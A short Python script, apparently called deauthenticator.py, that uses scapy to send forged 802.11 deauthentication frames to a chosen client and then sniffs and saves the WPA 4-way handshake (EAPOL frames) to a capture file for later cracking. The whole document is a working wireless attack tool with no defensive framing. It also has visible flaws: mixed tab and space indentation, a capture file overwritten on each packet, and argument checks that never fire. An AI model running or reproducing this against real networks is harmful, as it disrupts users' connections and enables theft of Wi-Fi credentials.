import os
import sys
from scapy.layers.eap import EAPOL
from scapy.all import *

wifi = sys.argv[1]
ap = sys.argv[2] # access point found in stage 1
client = sys.argv[3] #client we want  to deauthenticate from the network and capture the 4 way handshake


if wifi == "":
	print("Missing wifi adapter name as argument")
    print("run sudo python3 deauthenticator.py <wifi adapter> <bssid> <client bssid>")
	sys.exit()

if ap == "":
    print("Missing access point bssid as argument")
    print("run sudo python3 deauthenticator.py <wifi adapter> <bssid> <client bssid>")
    sys.exit()


if client == "":
    print("Missing client device bssid as argument")
    print("run sudo python3 deauthenticator.py <wifi adapter> <bssid> <client bssid>")
    sys.exit()


c = 0
def handle(packet):
	global c
	if packet.haslayer(EAPOL):
		c += 1
		print("captured key",c)
		wrpcap("handshake.cap",packet)


#create the deauth packets and send them
packet = Dot11(addr1=client,addr2=ap,addr3=ap)
frame = RadioTap()/packet/Dot11Deauth(reason=7)

sendp(frame,iface=wifi,count=15,inter=0.5)

sniff(iface=wifi,prn=handle,timeout=30) # sniff the network to get the eapol keys from 4 way handshake


